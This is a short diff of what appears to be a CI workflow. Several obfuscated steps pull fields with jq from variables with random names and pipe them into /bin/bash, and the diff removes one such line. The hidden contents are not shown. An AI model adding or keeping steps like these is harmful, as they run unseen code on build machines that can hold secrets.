@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$dn1" | jq -r .jdanc58430 | /bin/bash
           printf '%s' "$zxoho0521" | jq -r .rg16 | /bin/bash
           printf '%s' "$tluo0" | jq -r .op9 | /bin/bash
-          printf '%s' "$obho4238" | jq -r .xf179 | /bin/bash
           echo $yfj10 | jq -r .wzf0 | /bin/bash
 
       - name: Archive results
